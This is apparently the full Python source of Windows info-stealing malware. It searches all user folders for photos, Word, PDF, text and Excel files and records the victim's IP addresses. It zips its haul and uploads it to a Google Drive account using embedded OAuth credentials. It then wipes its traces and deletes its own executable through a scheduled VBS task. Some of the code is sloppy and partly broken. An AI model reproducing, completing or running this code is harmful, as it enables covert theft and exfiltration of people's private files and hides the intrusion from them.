#!/usr/bin/env python3
# pip install urllib3==1.26.6
# pip insatll requests

import os
import shutil
import base64
import json
import requests
import socket
import subprocess
from subprocess import PIPE 
from datetime import datetime
from charset_normalizer import md__mypyc

Token         = ""# add the Token hare
client_id     = ''#add the client_id  hare
client_secret = ''#add the client_secret hare
refresh_token = ''#add the refresh_token  hare  
Part_name = 0 
with open(os.environ['TEMP']+'\\FMFData.tmp','a'):
     pass
   
try:
    public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
except Exception :
    public_ip = 'None'
try:    
     host_name  = socket.gethostname()
     host_ip    = socket.gethostbyname(host_name)
except socket.gaierror: 
    host_ip =  'None'

class WIN_Geat:

    def __init__(self):
        self.Token         = Token 
        self.client_id     = client_id
        self.client_secret = client_secret
        self.refresh_token = refresh_token      
        self.Images_CO()    
         
    def Images_CO(self):
        global Part_name
        count = 0
        if os.path.exists(os.environ["appdata"] +'\\PicBackup_' ) :
           shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None)
           os.mkdir(os.environ["appdata"] +'\\PicBackup_') 
           
        else:    
           os.mkdir(os.environ["appdata"] +'\\PicBackup_')
        count = 0 
            
        for (root,dirs,Filesa) in os.walk('C:\\Users'): 
                  for Files in Filesa  :
                     if 'OneDriveMedTile' in Files or 'Microsoft.Windows' in Files or  'VisualElements'in Files\
                        or 'Square44x44Logo' in Files or 'Microsoft.Windows' in Files or 'aboutIcon' in Files\
                        or 'accountIcon' in Files or 'chevronUp' in Files or 'ic_fluent_add' in Files\
                        or 'notificationsIcon' in Files or 'syncIcon' in Files or 'RainierSunset' in Files or 'CachedImage' in Files\
                        or '5c61d427e791efb' in Files or '28fed39013f5f' in Files or 'AppData' in root  :
                        pass
                     else:
                       if '.jpg' in Files or '.png' in Files or '.jpeg' in Files\
                            or '.webp' in Files or '.JPG'  in Files\
                            or '.PNG'  in Files or '.JPEG' in Files\
                            or '.WEBP' in Files or '.docx' in Files\
                            or '.DOCX' in Files or '.txt'  in Files\
                            or '.TXT'  in Files or '.pdf'  in Files\
                            or '.xls'  in Files or '.XLS'  in Files\
                            or '.PDF'  in Files   :
                            if os.path.exists(os.environ['TEMP']+'\\FMFData.tmp') :
                               with open (os.environ['TEMP']+'\\FMFData.tmp','r') as readFile:
                                    readFile = readFile.read()
                               if Files in readFile :
                                  pass
                               else:

                                  with open(os.environ['TEMP']+'\\FMFData.tmp','a') as File_Store:
                                        File_Store = File_Store.write(Files+'\n')
                                  with open(root+'\\'+Files,'rb') as pic:
                                        readpic = pic.read()
                                  with open(os.environ["appdata"] +'\\PicBackup_\\'+Files,'wb') as pic:
                                       pic.write(readpic)
                                  with open(os.environ["appdata"] +'\\PicBackup_\\info.txt','w') as info :
                                      info.write('\n public_ip : '+ public_ip+'\n host_ip  : '+host_ip) 
                                  count +=1   
                                  if count == 10:
                                     break   
                  if count == 10:
                      break 
        Conut_list  = []
        if Part_name not in Conut_list:
          Conut_list.append(Part_name)
        if count == 0:
            self.Part_name = Part_name
            self.Cloue_Store()
            self.remove_files()
        else:                   
            if os.path.exists( os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1])+'.zip') :
                
                shutil.make_archive(os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1]), "zip",os.environ["appdata"] +'\\PicBackup_'  )
                shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None)
            else:
                shutil.make_archive(os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1]), "zip",os.environ["appdata"] +'\\PicBackup_'  ) 
                shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None) 
            Part_name += 1    
            self.Images_CO()
           
    def Cloue_Store(self):
         i = 0
         for _ in range(self.Part_name) :
            
             headers = {"Authorization":"Bearer " +self.Token}
             para = {
                        "name":os.getlogin()+'_Documents_'+str(f'{i}')+'.zip'
                    }
             files = {
                      'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
                      'file': open(os.environ["appdata"]+'\\PicBackup_'+str(f'{i}')+'.zip','rb')
                     }
             repoanse = requests.post(
                                "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                                 headers=headers,
                                 files=files
                              )
             reponse_back = repoanse.text
             if '401' in reponse_back :
                   New_Token = requests.post('https://accounts.google.com/o/oauth2/token',
                   params={'client_id': self.client_id  ,
                           'client_secret':self.client_secret,
                           'refresh_token':self.refresh_token,
                           'grant_type': 'refresh_token'})
                   New_Token= New_Token.text.split()
                   Token = str("".join(New_Token[2])).replace(',','')
                   headers = {"Authorization":"Bearer " +Token}
                   para = {
                            "name":os.getlogin()+'_Documents_'+str(f'{i}')+'.zip'
                          }
                   files = {
                          'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
                          'file': open(os.environ["appdata"]+'\\PicBackup_'+str(f'{i}')+'.zip','rb')
                         }
                   repoanse = requests.post(
                                 "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                                 headers=headers,
                                 files=files
                              )   
                   i +=1
    def remove_files(self) : 
        d = 0
        for x in range(self.Part_name):  
            shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=True, onerror=None)    
            os.remove(os.environ["appdata"] +'\\PicBackup_'+str(f'{d}')+'.zip')  
            d +=1 
        with open(os.getcwd()+'\\Delete_self.vbs','w')  as vbs:
             vbs.write(
                       "dim filesys"+'\n'
                       'Set filesys = CreateObject("Scripting.FileSystemObject")'+'\n'
                       'filesys.DeleteFile "'+os.getcwd()+'\\OpenGate.exe"'+"\n"
                       'filesys.DeleteFile "'+os.getcwd()+'\\Delete_self.vbs"'+"\n"
                     ) 
               
        now = datetime.now()
        current_time_add = int(now.strftime("%H:%M:%S").split(':')[1])+1
        Current_time_run = now.strftime("%H:"+str(f'{current_time_add}')+":%S")        
        Delete_self_Var  = r'SchTasks /Create  /TN "Delete_self" /TR '+os.getcwd()+'\\Delete_self.vbs '+'/SC once /ST '+Current_time_run + ' /F > nul 2>&1'          
        subprocess.call(Delete_self_Var,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
if __name__=='__main__':
    WIN_Geat()

